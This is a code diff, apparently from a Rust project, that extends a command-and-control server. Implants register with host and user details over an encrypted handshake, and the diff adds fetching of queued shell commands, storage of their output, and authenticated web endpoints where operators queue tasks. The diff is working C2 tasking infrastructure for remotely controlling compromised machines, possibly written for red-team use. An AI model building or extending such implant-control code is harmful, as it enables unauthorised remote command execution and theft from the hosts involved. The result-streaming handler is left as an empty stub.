@@ -2,18 +2,20 @@ use std::sync::Arc;
 
 use axum::{
     Extension, Json, Router,
-    extract::State,
+    extract::{Path, State},
     http::StatusCode,
-    routing::post,
+    response::{IntoResponse, Json as JsonResponse, Sse},
+    routing::{get, post},
 };
 use nw_profile::{
     crypto,
     envelope::{Envelope, Kind},
     msgs::{PollRequest, Register, RegisterAck, Task},
 };
+use std::convert::Infallible;
 use uuid::Uuid;
 
-use crate::db::repositories::Repository;
+use crate::{auth::middleware::AuthenticatedUserGuard, db::repositories::Repository};
 
 fn session_key(psk: &[u8]) -> [u8; crypto::KEY_LEN] {
     crypto::derive_key(psk, b"nw-m1-salt")
@@ -54,8 +56,7 @@ async fn register(
     // Register handshake is authenticated with the PSK-derived key; both sides
     // then roll ephemeral x25519 keys and DH them to derive a per-session key.
     let key = session_key(&psk);
-    let pt = crypto::decrypt(&key, env.id, &env.encrypted)
-        .map_err(|_| StatusCode::UNAUTHORIZED)?;
+    let pt = crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| StatusCode::UNAUTHORIZED)?;
     let reg: Register = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;
     let implant_pub = deb64(&reg.session_key).map_err(|_| StatusCode::BAD_REQUEST)?;
 
@@ -66,18 +67,34 @@ async fn register(
     let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);
 
     let sid = Uuid::new_v4();
-    repo.upsert_callback(&sid.to_string(), &reg.hostname, &reg.username, &reg.os, &reg.arch, reg.pid, &b64(&session_key))
-        .await
-        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    repo.upsert_callback(
+        &sid.to_string(),
+        &reg.hostname,
+        &reg.username,
+        &reg.os,
+        &reg.arch,
+        reg.pid,
+        &b64(&session_key),
+    )
+    .await
+    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
-    let ack = RegisterAck { session_id: sid, server_pub: b64(&server_kp.public_key()) };
+    let ack = RegisterAck {
+        session_id: sid,
+        server_pub: b64(&server_kp.public_key()),
+    };
     let reply_id = env.id + 1;
     let plaintext = serde_json::to_vec(&ack).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
     // Ack rides the PSK key so the implant can decrypt it before deriving the
     // DH session key; the session key encrypts only subsequent polls.
     let out = crypto::encrypt(&key, reply_id, &plaintext)
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
-    Ok(Json(Envelope::new(Kind::RegisterAck, reply_id, Some(sid), out)))
+    Ok(Json(Envelope::new(
+        Kind::RegisterAck,
+        reply_id,
+        Some(sid),
+        out,
+    )))
 }
 
 async fn poll(
@@ -94,20 +111,111 @@ async fn poll(
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
         .ok_or(StatusCode::UNAUTHORIZED)?;
     let key = deb64(&key_b64).map_err(|_| StatusCode::UNAUTHORIZED)?;
-    let pt = crypto::decrypt(&key, env.id, &env.encrypted)
-        .map_err(|_| StatusCode::UNAUTHORIZED)?;
+    let pt = crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| StatusCode::UNAUTHORIZED)?;
     let _req: PollRequest = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;
 
     repo.touch_callback(&sid.to_string())
         .await
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
+    // Store any task results the implant reported.
+    for result in &_req.results {
+        let _ = repo
+            .store_task_result(
+                &result.task_id.to_string(),
+                result.ok,
+                &result.stdout,
+                &result.stderr,
+                result.exit_code,
+            )
+            .await;
+    }
+
+    // Fetch pending tasks for this session and mark them as delivered/processing.
+    let tasks = repo
+        .fetch_pending_tasks(&sid.to_string())
+        .await
+        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
     let reply_id = env.id + 1;
-    let tasks: Vec<Task> = Vec::new();
-    let plaintext = serde_json::to_vec(&tasks).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let task_msgs: Vec<Task> = tasks
+        .iter()
+        .filter_map(|t| {
+            serde_json::from_value::<Vec<String>>(t.args_json.clone())
+                .ok()
+                .and_then(|args| {
+                    Some(Task {
+                        id: Uuid::new_v4(),
+                        command: t.command.clone(),
+                        args,
+                        timeout_ms: t.timeout_ms,
+                    })
+                })
+        })
+        .collect();
+    let plaintext =
+        serde_json::to_vec(&task_msgs).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
     let out = crypto::encrypt(&key, reply_id, &plaintext)
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
-    Ok(Json(Envelope::new(Kind::Heartbeat, reply_id, Some(sid), out)))
+    Ok(Json(Envelope::new(
+        Kind::Heartbeat,
+        reply_id,
+        Some(sid),
+        out,
+    )))
+}
+
+/// Web UI routes for C2 task management. Requires authentication.
+/// Provides an SSE endpoint for real-time task result streaming and a POST
+/// endpoint to enqueue tasks from the Mythic-style callback detail page.
+pub fn web_router() -> Router<Repository> {
+    Router::<Repository>::new()
+        .route("/c2/sessions/{session_id}/tasks/sse", get(task_results_sse))
+        .route("/c2/sessions/{session_id}/tasks", post(enqueue_web_task))
+}
+
+async fn enqueue_web_task(
+    AuthenticatedUserGuard(_user): AuthenticatedUserGuard,
+    State(repo): State<Repository>,
+    Path(session_id): Path<String>,
+    Json(payload): Json<EnqueueTaskRequest>,
+) -> Result<impl IntoResponse, StatusCode> {
+    let args_json = serde_json::json!(payload.args);
+    let task_id = repo
+        .enqueue_task(
+            &session_id,
+            &payload.command,
+            &args_json,
+            payload.timeout_ms.unwrap_or(30_000),
+        )
+        .await
+        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    Ok(JsonResponse(serde_json::json!({
+        "id": task_id,
+        "command": payload.command,
+        "status": "pending",
+    })))
+}
+
+#[derive(Debug, serde::Deserialize)]
+struct EnqueueTaskRequest {
+    command: String,
+    args: Option<Vec<String>>,
+    timeout_ms: Option<u64>,
+}
+
+/// SSE handler that streams task result events for a callback session.
+/// Clients connect with EventSource and receive task_completed / task_error
+/// events as they arrive.
+async fn task_results_sse(
+    AuthenticatedUserGuard(_user): AuthenticatedUserGuard,
+    State(repo): State<Repository>,
+    Path(session_id): Path<String>,
+) -> Sse<impl futures::Stream<Item = Result<axum::response::sse::Event, Infallible>> + Send> {
+    use futures::stream;
+
+    let _ = repo.list_tasks_for_session(&session_id).await;
+    Sse::new(stream::empty())
 }
 
 #[cfg(test)]
@@ -166,7 +274,9 @@ mod tests {
         let ack_msg: RegisterAck = serde_json::from_slice(&ack_pt).unwrap();
 
         // Derive the shared session key as the implant would.
-        let shared = implant_kp.shared_secret(&deb64(&ack_msg.server_pub).unwrap()).unwrap();
+        let shared = implant_kp
+            .shared_secret(&deb64(&ack_msg.server_pub).unwrap())
+            .unwrap();
         let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);
 
         let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM callbacks")
